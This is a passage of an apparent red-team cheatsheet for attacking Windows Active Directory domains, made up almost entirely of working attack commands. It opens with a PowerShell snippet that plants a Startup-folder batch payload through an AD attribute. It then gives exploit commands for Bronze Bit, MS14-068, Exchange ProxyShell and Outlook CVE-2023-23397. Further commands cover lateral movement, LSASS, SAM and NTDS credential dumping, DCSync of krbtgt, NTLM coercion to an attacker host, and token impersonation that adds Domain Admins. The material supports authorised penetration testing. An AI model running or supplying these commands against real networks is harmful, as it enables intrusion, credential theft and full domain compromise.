$malicious_hex = "25335c2e2e5c2e2e5c57696e646f77735c5374617274204d656e755c50726f6772616d735c537461727475705c6d616c6963696f75732e6261740000000000000000000000000000000000000000000000000000000000000000000000000000f0a1f04c9c1ad80100000000f52f696ec0f1d3b13e9d9d553adbb491ca6cc7a319000000406563686f206f66660d0a73746172742063616c632e657865"
$attribute_string = "B:$($malicious_hex.Length):${malicious_hex}:$($user.DistinguishedName)"
Set-ADUser -Identity $user -Add @{msPKIAccountCredentials=$attribute_string} -Verbose

# Set new msPKIRoamingTimestamp so the victim machine knows an update was pushed
$new_msPKIRoamingTimestamp = ($user.msPKIRoamingTimestamp[8..15] + [System.BitConverter]::GetBytes([datetime]::UtcNow.ToFileTime())) -as [byte[]]
Set-ADUser -Identity $user -Replace @{msPKIRoamingTimestamp=$new_msPKIRoamingTimestamp} -Verbose
</code></pre>
<ul id="bkmrk-bronze-bit-%28cve-2020"><li>
<a href="https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-overview">Bronze Bit</a> (CVE-2020-17049)</li>
</ul><p id="bkmrk-to-exploit-this-cve%2C">To exploit this CVE, a controlled service account with constrained delegation to the target account is needed.</p>
<pre id="bkmrk-getst.py--force-forw"><code class="language-bash">getST.py -force-forwardable -spn &lt;cifs/target.domain.local&gt; -impersonate Administrator -dc-ip &lt;DC_IP&gt; -hashes :&lt;service_account_hash&gt; domain.local/&lt;service_account&gt;
</code></pre>
<ul id="bkmrk-ms14-068"><li>
<a href="https://tools.thehacker.recipes/impacket/examples/goldenpac.py">MS14-068</a>
</li>
</ul><pre id="bkmrk-goldenpac.py-%27domain"><code class="language-bash">goldenPac.py 'domain.local'/'user1':'password'@&lt;DC_IP&gt;
</code></pre>
<h3 id="bkmrk-targeting-exchange-s">Targeting Exchange server</h3>
<ul id="bkmrk-proxynotshell-%2F-prox"><li>ProxyNotShell / ProxyShell / ProxyLogon (CVE-2022-41040 &amp; CVE-2022-41082 / CVE-2021-34473 &amp; CVE-2021-34523 &amp; CVE-2021-31207 / CVE-2021-26855 &amp; CVE-2021-27065)</li>
</ul><p id="bkmrk-the-exploits-in-the--0">The exploits in the Metasploit framework are good for these three CVEs.</p>
<pre id="bkmrk-msf6-exploit%28windows-0"><code class="language-bash">msf6 exploit(windows/http/exchange_proxynotshell_rce) &gt;
msf6 exploit(windows/http/exchange_proxyshell_rce) &gt;
msf6 exploit(windows/http/exchange_proxylogon_rce) &gt;
</code></pre>
<ul id="bkmrk-cve-2023-23397"><li>
<a href="https://github.com/Trackflaw/CVE-2023-23397">CVE-2023-23397</a>
</li>
</ul><p id="bkmrk-this-cve-permits-to-">This CVE permits to leak the NTLM hash of the target as soon as the email arrives in his Outlook mail box. This PoC generates a <code>.msg</code> file containing the exploit in the pop-up sound attribute. It is up to you to send the email to the target.</p>
<pre id="bkmrk-python3-cve-2023-233"><code class="language-bash">python3 CVE-2023-23397.py --path '\\&lt;attacker_IP&gt;\'
</code></pre>
<p id="bkmrk-before-sending-the-e">Before sending the email, run Responder to intercept the NTLM hash.</p>
<h3 id="bkmrk-for-local-privesc">For local privesc</h3>
<p id="bkmrk-look-at-the-active-d">Look at the <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory">Active Directory cheatsheet</a> for this part.</p>
<h2 id="bkmrk-domain-enumeration">Domain Enumeration</h2>
<h3 id="bkmrk-domain-policy">Domain policy</h3>
<h4 id="bkmrk-current-domain">Current domain</h4>
<pre id="bkmrk-%23domain-policy-with-"><code class="language-bash">#Domain policy with ldeep
ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; domain_policy

#Password policy with NXC
nxc smb &lt;targets&gt; -u user1 -p password --pass-pol
</code></pre>
<h4 id="bkmrk-another-domain">Another domain</h4>
<pre id="bkmrk-ldeep-ldap--u-user1-"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;remote_LDAP_server_IP&gt; domain_policy
</code></pre>
<h3 id="bkmrk-domain-controller">Domain controller</h3>
<p id="bkmrk-the-dns-is-generally">The DNS is generally on the DC.</p>
<pre id="bkmrk-nslookup-domain.loca"><code class="language-bash">nslookup domain.local
nxc smb &lt;DC_IP&gt; -u user1 -p password
</code></pre>
<h3 id="bkmrk-users-enumeration">Users enumeration</h3>
<h4 id="bkmrk-list-users">List users</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--0"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; users
</code></pre>
<h4 id="bkmrk-user%27s-properties">User's properties</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--1"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; users -v
nxc ldap &lt;DC_IP&gt; -u user1 -p password -M get-unixUserPassword -M getUserPassword
</code></pre>
<h4 id="bkmrk-search-for-a-particu">Search for a particular string in attributes</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--2"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; users -v |grep -i password
</code></pre>
<h4 id="bkmrk-actively-logged-user">Actively logged users on a machine</h4>
<p id="bkmrk-needs-local-admin-ri">Needs local admin rights on the target</p>
<pre id="bkmrk-nxc-smb-%3Ctarget%3E--u--0"><code class="language-bash">nxc smb &lt;target&gt; -u user1 -p password --sessions
</code></pre>
<h3 id="bkmrk-user-hunting">User hunting</h3>
<h4 id="bkmrk-find-machine-where-t">Find machine where the user has admin privs</h4>
<p id="bkmrk-if-a-pwned-connectio">If a <strong>Pwned</strong> connection appears, admin rights are present. However, if the UAC is present it can block the detection.</p>
<pre id="bkmrk-nxc-smb-%3Ctargets_fil"><code class="language-bash">nxc smb &lt;targets_file&gt; -u user1 -p password
</code></pre>
<h4 id="bkmrk-find-local-admins-on">Find local admins on a domain machine</h4>
<p id="bkmrk-lookupadmins.py"><a href="https://gist.github.com/ropnop/7a41da7aabb8455d0898db362335e139">lookupadmins.py</a></p>
<pre id="bkmrk-python3-lookupadmins"><code class="language-bash">python3 lookupadmins.py domain.local/user1:password@&lt;target_IP&gt;

#NXC
nxc smb &lt;targets&gt; -u user1 -p password --local-groups Administrators
</code></pre>
<h3 id="bkmrk-computers-enumeratio">Computers enumeration</h3>
<pre id="bkmrk-ldeep-ldap--u-user1--3"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; machines

#Full info
ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; machines -v

#Hostname enumeration
ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; computers
ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; computers --resolve
</code></pre>
<h3 id="bkmrk-groups-enumeration">Groups enumeration</h3>
<h4 id="bkmrk-groups-in-the-curren">Groups in the current domain</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--4"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; groups

#Full info
ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; groups -v
</code></pre>
<h4 id="bkmrk-search-for-a-particu-0">Search for a particular string in attributes</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--5"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; groups -v |grep -i admin
</code></pre>
<h4 id="bkmrk-all-users-in-a-speci">All users in a specific group</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--6"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; membersof &lt;group&gt; -v
</code></pre>
<h4 id="bkmrk-all-groups-of-an-use">All groups of an user</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--7"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; memberships &lt;user_account&gt;
</code></pre>
<h4 id="bkmrk-local-groups-enumera">Local groups enumeration</h4>
<pre id="bkmrk-nxc-smb-%3Ctarget%3E--u--1"><code class="language-bash">nxc smb &lt;target&gt; -u user1 -p password --local-groups
</code></pre>
<h4 id="bkmrk-members-of-a-local-g">Members of a local group</h4>
<pre id="bkmrk-nxc-smb-%3Ctarget%3E--u--2"><code class="language-bash">nxc smb &lt;target&gt; -u user1 -p password --local-groups &lt;group&gt;
</code></pre>
<h3 id="bkmrk-shares-%2F-files">Shares / Files</h3>
<h4 id="bkmrk-find-shares-on-the-d">Find shares on the domain</h4>
<pre id="bkmrk-nxc-smb-%3Ctargets%3E--u"><code class="language-bash">nxc smb &lt;targets&gt; -u user1 -p password --shares
</code></pre>
<p id="bkmrk-a-module-for-searchi">A module for searching network shares:<code>spider_plus</code>. Running the module without any options (on a /24, for example) will produce a JSON output for each server, containing a list of all files (and some info), but without their contents. Then grep on extensions (conf, ini...) or names (password .. ) to identify an interesting file to search:</p>
<pre id="bkmrk-nxc-smb-%3Ctargets%3E--u-0"><code class="language-bash">nxc smb &lt;targets&gt; -u user1 -p password -M spider_plus
</code></pre>
<p id="bkmrk-then%2C-when-identifyi">Then, when identifying a lot of interesting files, to speed up the search, dump this on the attacker machine by adding the <code>-o READ_ONLY=False</code> option after the <code>-M spider_plus</code> (but avoid /24, otherwise it'll take a long time). In this case, NetExec will create a folder with the machine's IP, and all the folders/files in it.</p>
<pre id="bkmrk-nxc-smb-%3Ctargets%3E--u-1"><code class="language-bash">nxc smb &lt;targets&gt; -u user1 -p password -M spider_plus -o READ_ONLY=False
</code></pre>
<p id="bkmrk-manspider-can-also-b">Manspider can also be used for this purpose. It permits to crawl all the shares or specific ones, and filter on file extensions, file names, and file contents.</p>
<pre id="bkmrk-%23-filter-on-file-nam"><code class="language-bash"># Filter on file names
manspider &lt;targets&gt; -f passw user admin account network login logon cred -d domain -u user1 -p password

# Search for content
manspider &lt;targets&gt; -c passw cpassword -d domain -u user1 -p password

# Search for file extension
manspider &lt;targets&gt; -e bat com vbs ps1 psd1 psm1 pem key rsa pub reg pfx cfg conf config vmdk vhd vdi dit -d domain -u user1 -p password
</code></pre>
<p id="bkmrk-parameters-can-be-co">Parameters can be combined.</p>
<h4 id="bkmrk-find-files-with-a-sp">Find files with a specific pattern</h4>
<pre id="bkmrk-nxc-smb-%3Ctargets%3E--u-2"><code class="language-bash">nxc smb &lt;targets&gt; -u user1 -p password --spider &lt;share_name&gt; --content --pattern pass
</code></pre>
<h4 id="bkmrk-find-files-with-sens">Find files with sensitive data</h4>
<p id="bkmrk-python-version-of-sn">Python version of Snaffler</p>
<pre id="bkmrk-pysnaffler-%27smb2%2Bntl"><code class="language-bash">pysnaffler 'smb2+ntlm-password://domain\user1:password@&lt;target&gt;' &lt;target&gt;
</code></pre>
<h3 id="bkmrk-gpo-enumeration">GPO enumeration</h3>
<h4 id="bkmrk-list-of-gpo-in-the-d">List of GPO in the domain</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--8"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; gpo
</code></pre>
<h3 id="bkmrk-organisation-units">Organisation Units</h3>
<h4 id="bkmrk-ous-of-the-domain-an">OUs of the domain and their linked GPOs</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--9"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; ou
</code></pre>
<h4 id="bkmrk-computers-within-an-">Computers within an OU</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--10"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; machines -v |grep -i "OU=&lt;OU_name&gt;" |grep -i "distinguishedName"
</code></pre>
<h3 id="bkmrk-dacls">DACLs</h3>
<h4 id="bkmrk-all-acls-associated-">All ACLs associated to an object (inbound)</h4>
<pre id="bkmrk-%23with-samaccountname"><code class="language-bash">#With samAccountName
dacledit.py -action read -target &lt;target_samAccountName&gt; -dc-ip &lt;DC_IP&gt; domain.local/user1:password

#With DN
dacledit.py -action read -target-dn &lt;target_DN&gt; -dc-ip &lt;DC_IP&gt; domain.local/user1:password

#With SID
dacledit.py -action read -target-sid &lt;target_SID&gt; -dc-ip &lt;DC_IP&gt; domain.local/user1:password
</code></pre>
<h4 id="bkmrk-outbound-acls-of-an-">Outbound ACLs of an object</h4>
<p id="bkmrk-these-are-the-rights">These are the rights a principal has against another object</p>
<pre id="bkmrk-dacledit.py--action-"><code class="language-bash">dacledit.py -action read -target &lt;target_samAccountName&gt; -principal &lt;principal_samAccountName&gt; &lt;-dc-ip &lt;DC_IP&gt; domain.local/user1:password
</code></pre>
<h3 id="bkmrk-trusts">Trusts</h3>
<h4 id="bkmrk-trusts-for-the-curre">Trusts for the current domain</h4>
<pre id="bkmrk-ldeep-ldap--u-user1--11"><code class="language-bash">ldeep ldap -u user1 -p password -d domain.local -s &lt;LDAP_server_IP&gt; trusts
</code></pre>
<h2 id="bkmrk-bloodhound">BloodHound</h2>
<p id="bkmrk-the-bloodhound-pytho">The Bloodhound-python module doesn't support all the SharpHound features (essentially about GPOs)</p>
<h3 id="bkmrk-dns-resolution">DNS resolution</h3>
<p id="bkmrk-sometimes-the-dns-re">Sometimes the DNS resolution to find the DC doesn't work very well. <strong>dnschef</strong> can solve this problem:</p>
<pre id="bkmrk-dnschef---fakeip-%3Cdc"><code class="language-bash">dnschef --fakeip &lt;DC_IP&gt; --fakedomains domain.local -q
</code></pre>
<p id="bkmrk-then%2C-in-the-bloodho">Then, in the BloodHound command specify the DNS address with <code>-ns 127.0.0.1</code>, <strong>dnschef</strong> will do the work.</p>
<h3 id="bkmrk-basic-usage">Basic usage</h3>
<pre id="bkmrk-%23-default-collection"><code class="language-bash"># Default collection
bloodhound-python -u user1 -p password -d domain.local -dc DC.domain.local --zip

# All collection excepted LoggedOn
bloodhound-python -u user1 -p password -d domain.local -c all -dc DC.domain.local --zip
#With LoggedOn
bloodhound-python -u user1 -p password -d domain.local -c all,LoggedOn -dc DC.domain.local --zip

#Only collect from the DC, doesn't query the computers (more stealthy)
bloodhound-python -u user1 -p password -d domain.local -c DCOnly -dc DC.domain.local --zip
</code></pre>
<h3 id="bkmrk-specify-another-glob">Specify another Global Catalog</h3>
<pre id="bkmrk-bloodhound-python--u"><code class="language-bash">bloodhound-python -u user1 -p password -d domain.local -dc DC.domain.local -gc &lt;hostname&gt; --zip
</code></pre>
<h3 id="bkmrk-interesting-neo4j-qu">Interesting Neo4j queries</h3>
<h4 id="bkmrk-users-with-spns">Users with SPNs</h4>
<pre id="bkmrk-match-%28u%3Auser-%7Bhassp"><code class="language-sql">MATCH (u:User {hasspn:true}) RETURN u
</code></pre>
<h4 id="bkmrk-as-rep-roastable-use">AS-REP Roastable users</h4>
<pre id="bkmrk-match-%28u%3Auser-%7Bdontr"><code class="language-sql">MATCH (u:User {dontrepreauth:true}) RETURN u
</code></pre>
<h4 id="bkmrk-computers-allowedtod">Computers AllowedToDelegate to other computers</h4>
<pre id="bkmrk-match-%28c%3Acomputer%29%2C-"><code class="language-sql">MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]-&gt;(t)) return p
</code></pre>
<h4 id="bkmrk-shortest-path-from-k">Shortest path from Kerberoastable user</h4>
<pre id="bkmrk-match-%28u%3Auser-%7Bhassp-0"><code class="language-sql">MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]-&gt;(c)) RETURN p
</code></pre>
<h4 id="bkmrk-computers-in-unconst">Computers in Unconstrained Delegations</h4>
<pre id="bkmrk-match-%28c%3Acomputer-%7Bu"><code class="language-sql">MATCH (c:Computer {unconsraineddelegation:true}) RETURN c
</code></pre>
<h4 id="bkmrk-rights-against-gpos">Rights against GPOs</h4>
<pre id="bkmrk-match-%28gr%3Agroup%29%2C-%28g"><code class="language-sql">MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]-&gt;(gp)) return p
</code></pre>
<h4 id="bkmrk-potential-sql-admins">Potential SQL Admins</h4>
<pre id="bkmrk-match-p%3D%28u%3Auser%29-%5B%3As"><code class="language-sql">MATCH p=(u:User)-[:SQLAdmin]-&gt;(c:Computer) return p
</code></pre>
<h4 id="bkmrk-laps">LAPS</h4>
<p id="bkmrk-machine-with-laps-en">Machine with LAPS enabled</p>
<pre id="bkmrk-match-%28c%3Acomputer-%7Bh"><code class="language-sql">MATCH (c:Computer {haslaps:true}) RETURN c 
</code></pre>
<p id="bkmrk-users-with-read-laps">Users with read LAPS rights against "LAPS machines"</p>
<pre id="bkmrk-match-p%3D%28g%3Agroup%29-%5B%3A"><code class="language-sql">MATCH p=(g:Group)-[:ReaLAPSPassword]-&gt;(c:Computer) return p
</code></pre>
<h3 id="bkmrk-soaphound">SOAPHound</h3>
<p id="bkmrk-a-tool-to-gather-lda">A tool to gather LDAP information through the ADWS service with SOAP queries instead of the LDAP one. Data can be displayed in BloodHound. This tool is presented in the Active Directory cheatsheet.</p>
<h3 id="bkmrk-ad-miner">AD Miner</h3>
<p id="bkmrk-ad-miner-is-another-"><a href="https://github.com/Mazars-Tech/AD_Miner">AD Miner</a> is another solution to display BloodHound data into a web based GUI. It is usefull for its <strong>Smartest paths</strong> feature that permits to display the, sometimes longer, but simpler compromission path (for example, when the shortest path implies a <code>ExecuteDCOM</code> edge).</p>
<h2 id="bkmrk-lateral-movement">Lateral Movement</h2>
<h3 id="bkmrk-winrm">WinRM</h3>
<pre id="bkmrk-evil-winrm--u-user1-"><code class="language-bash">evil-winrm -u user1 -p password -i &lt;target_IP&gt;
</code></pre>
<p id="bkmrk-evil-winrm-permits-t"><strong>evil-winrm</strong> permits to open an interactive WinRM session where it is possible to <code>upload</code> and <code>download</code> items between the target and the attacker machine, load PowerShell scripts, etc.</p>
<h3 id="bkmrk-smb">SMB</h3>
<h4 id="bkmrk-from-one-computer-to">From one computer to another one</h4>
<pre id="bkmrk-psexec.py-domain.loc"><code class="language-bash">psexec.py domain.local/user1:password@&lt;target&gt;
</code></pre>
<h4 id="bkmrk-from-one-computer-to-0">From one computer to many ones</h4>
<pre id="bkmrk-nxc-smb-%3Ctargets%3E--u-3"><code class="language-bash">nxc smb &lt;targets&gt; -u user1 -p password -X &lt;command&gt;
</code></pre>
<h4 id="bkmrk-execute-immediat-sch">Execute immediat scheduled task</h4>
<pre id="bkmrk-%23as-the-session-0-%28s"><code class="language-bash">#As the session 0 (SYSTEM)
atexec.py domain.local/user1:password@&lt;target&gt; &lt;command&gt;

#As the user of another session on the machine
atexec.py -session-id &lt;ID&gt; domain.local/user1:password@&lt;target&gt; &lt;command&gt;
</code></pre>
<h3 id="bkmrk-wmi">WMI</h3>
<pre id="bkmrk-wmiexec.py-domain.lo"><code class="language-bash">wmiexec.py domain.local/user1:password@&lt;target&gt;
</code></pre>
<h3 id="bkmrk-shellbrowserwindow-d">ShellBrowserWindow DCOM object</h3>
<pre id="bkmrk-dcomexec.py-domain.l"><code class="language-bash">dcomexec.py domain.local/user1:password@&lt;target&gt;
</code></pre>
<h3 id="bkmrk-credentials-gatherin">Credentials gathering</h3>
<h4 id="bkmrk-check-runasppl">Check RunAsPPL</h4>
<p id="bkmrk-check-if-runasppl-is">Check if RunAsPPL is enabled in the registry.</p>
<pre id="bkmrk-nxc-smb-%3Ctarget%3E--u--3"><code class="language-bash">nxc smb &lt;target&gt; -u user1 -p password -M runasppl
</code></pre>
<h4 id="bkmrk-dump-creds-remotely">Dump creds remotely</h4>
<pre id="bkmrk-%23dump-sam-database-o"><code class="language-bash">#Dump SAM database on a machine
nxc smb &lt;target&gt; -u user1 -p password --sam

#Dump LSA secrets on a machine
nxc smb &lt;target&gt; -u user1 -p password --lsa
    #In a PDF with LSA_reg2pdf, exec get_pdf, and get_bootkey on your host to parse the PDF
.\get_pdf.exe 1
python3 get_bootkey.py

#Dump through remote registry
reg.py -o \\&lt;attacker_IP&gt;\share domain.local/user1:password@&lt;target&gt; backup
reg.py domain.local/user1:password@&lt;target&gt; query -keyName 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon'

#Dump with an alternative method, regsecrets.py, more discreet
regsecrets.py domain.local/user1:password@target.domain.local

#Dump the lsass process and parse it
nxc smb &lt;target&gt; -u user1 -p password -M lsassy
nxc smb &lt;target&gt; -u user1 -p password -M nanodump
nxc smb &lt;target&gt; -u user1 -p password -M mimikatz
nxc smb &lt;target&gt; -u user1 -p password -M procdump

lsassy -u user1 -p password -d domain.local &lt;target&gt;

minidump domain.local/user1:password@dc.domain.local:/C$/Windows/Temp/lsass.dmp

#Retrieve Chrome passwords
nxc smb &lt;target&gt; -u user1 -p password -M enum_chrome

#Make a DCSync attack on all the users (NT hashes, Kerberos AES key, etc)
secretsdump.py domain.local/user1:password@&lt;DC&gt;
nxc smb &lt;target&gt; -u user1 -p password --ntds

#DCSync only the NT &amp;&amp; LM hashes of a user
secretsdump.py -just-dc-user 'krbtgt' -just-dc-ntlm domain.local/user1:password@&lt;DC&gt;

#Retrieve NT hashes via Key List Attack on a RODC
    #Attempt to dump all the users' hashes even the ones in the Denied list
    #Low privileged credentials are needed in the command for the SAMR enumeration
keylistattack.py -rodcNo &lt;krbtgt_number&gt; -rodcKey &lt;krbtgt_aes_key&gt; -full domain.local/user1:password@RODC-server
    #Attempt to dump a specific user's hash
keylistattack.py -rodcNo &lt;krbtgt_number&gt; -rodcKey &lt;krbtgt_aes_key&gt; -t user1 -kdc RODC-server.domain.local LIST

#Certsync - retrieve the NT hashes of all the users with PKINIT
#Backup the private key and the certificate of the Root CA, and forge Golden Certificates for all the users
#Authenticate with all the certificate via PKINIT to obtain the TGTs and extract the hashes with UnPAC-The-Hash
certsync -u administrator -p 'password' -d domain.local -dc-ip &lt;DC_IP&gt;

    #Provide the CA .pfx if it has been obtained with another way
certsync -u administrator -p 'password' -d domain.local -dc-ip &lt;DC_IP&gt; -ca-pfx CA.pfx
</code></pre>
<p id="bkmrk-many-techniques-to-d">Many techniques to dump LSASS : <a href="https://redteamrecipe.com/50-Methods-For-Dump-LSASS/">https://redteamrecipe.com/50-Methods-For-Dump-LSASS/</a></p>
<h4 id="bkmrk-extract-creds-locall">Extract creds locally</h4>
<p id="bkmrk-the-system-hive-is-n">The <strong>SYSTEM</strong> hive is needed to retrieve the bootkey and decipher the DB files.</p>
<pre id="bkmrk-%23extract-creds-from-"><code class="language-bash">#Extract creds from SAM and SECURITY (LSA cached secrets)
secretsdump.py -system ./system.save -sam ./sam.save -security ./security.save LOCAL

#Extract creds from NTDS.dit
secretsdump.py -system ./system.save -ntds ./NTDS.save LOCAL
</code></pre>
<p id="bkmrk-read-an-lsass-dump-w">Read an LSASS dump with pypykatz:</p>
<pre id="bkmrk-pypykatz-lsa---json-"><code class="language-bash">pypykatz lsa --json minidump $i | jq 'first(.[]).logon_sessions | keys[] as $k | (.[$k] | .credman_creds)' | grep -v "\[\]" | grep -v "^\[" | grep -v "^\]"
</code></pre>
<h4 id="bkmrk-credentials-vault-%26-">Credentials Vault &amp; DPAPI</h4>
<p id="bkmrk-decipher-vault-with-">Decipher Vault with Master Key</p>
<pre id="bkmrk-dpapi.py-vault--vcrd"><code class="language-bash">dpapi.py vault -vcrd &lt;vault_file&gt; -vpol &lt;vault_policy_file&gt; -key &lt;master_key&gt;
</code></pre>
<p id="bkmrk-dump-all-secrets-on-">Dump all secrets on a remote machine</p>
<pre id="bkmrk-donpapi.py-domain.lo"><code class="language-bash">DonPAPI.py domain.local/user1:password@&lt;target&gt;
</code></pre>
<p id="bkmrk-extract-the-domain-b">Extract the domain backup key with a Domain Admin</p>
<pre id="bkmrk-dpapi.py-backupkeys-"><code class="language-bash">dpapi.py backupkeys --export -t domain.local/user1:password@&lt;DC_IP&gt;
</code></pre>
<p id="bkmrk-dump-all-user-secret">Dump all user secrets with the backup key</p>
<pre id="bkmrk-donpapi.py--pvk-doma"><code class="language-bash">DonPAPI.py -pvk domain_backupkey.pvk domain.local/user1:password@&lt;targets&gt;
</code></pre>
<h4 id="bkmrk-gpppassword-%26-gpp-au">GPPPassword &amp; GPP Autologin</h4>
<p id="bkmrk-find-and-decrypt-gro">Find and decrypt Group Policy Preferences passwords.</p>
<pre id="bkmrk-get-gpppassword.py-d"><code class="language-bash">Get-GPPPassword.py domain.local/user1:password@&lt;target&gt;
    #Specific share
Get-GPPPassword.py -share &lt;share&gt; domain.local/user1:password@&lt;target&gt;

#GPP autologin
nxc smb &lt;target&gt; -u user1 -p password -M gpp_autologin
</code></pre>
<h4 id="bkmrk-credentials-in-third">Credentials in third-party softwares</h4>
<p id="bkmrk-many-applications-pr">Many applications present on a computer can store credentials, like KeePass, KeePassXC, mstsc and so on.</p>
<pre id="bkmrk-python3-client%2Fthiev"><code class="language-bash">python3 client/ThievingFox.py poison --all domain.local/user1:password@&lt;target&gt;
python3 client/ThievingFox.py collect --all domain.local/user1:password@&lt;target&gt;
python3 client/ThievingFox.py cleanup --all domain.local/user1:password@&lt;target&gt;
</code></pre>
<h4 id="bkmrk-force-a-ntlm-authent">Force a NTLM authentication from a connected user</h4>
<p id="bkmrk-this-attack-weaponiz">This attack weaponize DCOM objects to perform actions on behalf of an interactively connected user. Can be mixed with the NTLM downgrade or WebClient attacks to obtain NTLMv1 or HTTP authentication. Explains <a href="https://www.ibm.com/think/x-force/remotemonologue-weaponizing-dcom-ntlm-authentication-coercions">here</a>.</p>
<pre id="bkmrk-%23with-ntlm-downgrade"><code class="language-bash">#With NTLM downgrade
RemoteMonologue.py domain/user1:password@target -auth-to &lt;attacker_IP&gt; -downgrade

#With WebClient and an alternative DCOM object
RemoteMonologue.py domain/user1:password@target -auth-to &lt;attacker_netbios@80&gt; -webclient -dcom FileSystemImage
</code></pre>
<h3 id="bkmrk-pass-the-challenge">Pass the Challenge</h3>
<p id="bkmrk-this-technique-permi">This technique permits to retrieve the NT hashes from a LSASS dump when Credential Guard is in place. This<a href="https://github.com/ly4k/Pypykatz"> modified version of Pypykatz</a> must be used to parse the LDAP dump. Full explains <a href="https://research.ifcr.dk/pass-the-challenge-defeating-windows-defender-credential-guard-31a892eee22">here</a>.</p>
<p id="bkmrk-this-attack-is-prese">This attack is presented in the Active Directory cheatsheet.</p>
<h3 id="bkmrk-token-manipulation">Token manipulation</h3>
<h4 id="bkmrk-token-impersonation-">Token impersonation with command execution and user addition</h4>
<p id="bkmrk-blog-here."><a href="https://sensepost.com/blog/2022/abusing-windows-tokens-to-compromise-active-directory-without-touching-lsass/">Blog here</a>.</p>
<ul id="bkmrk-list-available-token"><li>List available tokens, and find an interesting token ID</li>
</ul><pre id="bkmrk-nxc-smb--u-user1--p-"><code class="language-bash">nxc smb -u user1 -p password -M impersonate -o MODULE=list
</code></pre>
<ul id="bkmrk-with-only-seimperson"><li>With only <strong>SeImpersonatePrivilege</strong>, if a privileged user's token is present on the machine, it is possible to run code on the domain as him and add a new user in the domain (and add him to the Domain Admins by default):</li>
</ul><pre id="bkmrk-nxc-smb--u-user1--p--0"><code class="language-bash"> nxc smb -u user1 -p password -M impersonate -o MODULE=adduser TOKEN=&lt;token_id&gt; CMD="user2 password 'Domain Admins' \\dc.domain.local"
</code></pre>
<ul id="bkmrk-with-seimpersonatepr"><li>With <strong>SeImpersonatePrivilege and SeAssignPrimaryToken</strong>, if a privileged user's token is present on the machine, it is possible to execute comands on the machine as him:</li>
</ul><pre id="bkmrk-nxc-smb--u-user1--p--1"><code class="language-bash"> nxc smb -u user1 -p password -M impersonate -o MODULE=exec TOKEN=&lt;token_id&gt; CMD=&lt;command&gt;
</code></pre>
<p id="bkmrk-look-at-the-active-d-0">Look at the Active Directory cheatsheet for other solutions.</p>
<h4 id="bkmrk-tokens-and-adcs">Tokens and ADCS</h4>
<p id="bkmrk-with-administrative-">With administrative access to a (or multiple) computer, it is possible to retrieve the different process tokens, impersonate them and request CSRs and PEM certificate for the impersonated users.</p>
<pre id="bkmrk-masky--d-domain.loca"><code class="language-bash">masky -d domain.local -u user1 -p &lt;password&gt; -dc-ip &lt;DC_IP&gt; -ca &lt;CA_server_FQDN\CA_name&gt; -o &lt;result_folder&gt; &lt;targets&gt;
</code></pre>
<h3 id="bkmrk-pass-the-hash">Pass The Hash</h3>
<p id="bkmrk-globally%2C-all-the-im">Globally, all the <strong>Impacket</strong> tools and the ones that use the library can authenticate via Pass The Hash with the <code>-hashes</code> command line parameter instead of specifying the password. For <strong>ldeep</strong>, <strong>NetExec</strong> and <strong>evil-winrm</strong>, it's <code>-H</code>.</p>
<h3 id="bkmrk-over-pass-the-hash-%2F">Over Pass The Hash / Pass The Key</h3>
<p id="bkmrk-globally%2C-all-the-im-0">Globally, all the <strong>Impacket</strong> tools and the ones that use the library can authenticate via Pass The Key with the <code>-aesKey</code> command line parameter instead of specifying the password. For <strong>NetExec</strong> it's <code>--aesKey</code>.</p>
<h3 id="bkmrk-kerberos-authenticat">Kerberos authentication</h3>
<h4 id="bkmrk-request-a-tgt-or-a-s">Request a TGT or a ST</h4>
<pre id="bkmrk-gettgt.py--dc-ip-%3Cdc"><code class="language-bash">getTGT.py -dc-ip &lt;DC_IP&gt; domain.local/user1:password

getST.py -spn "cifs/target.domain.local" -dc-ip &lt;DC_IP&gt; domain.local/user1:password
</code></pre>
<h4 id="bkmrk-use-the-tickets">Use the tickets</h4>
<p id="bkmrk-load-a-kerberos-tick">Load a kerberos ticket in <code>.ccache</code> format : <code>export KRB5CCNAME=./ticket.ccache</code></p>
<p id="bkmrk-globally%2C-all-the-im-1">Globally, all the <strong>Impacket</strong> tools and the ones that use the library can authenticate via Kerberos with the <code>-k -no-pass</code> command line parameter instead of specifying the password. For <strong>ldeep</strong> it's <code>-k</code>.</p>
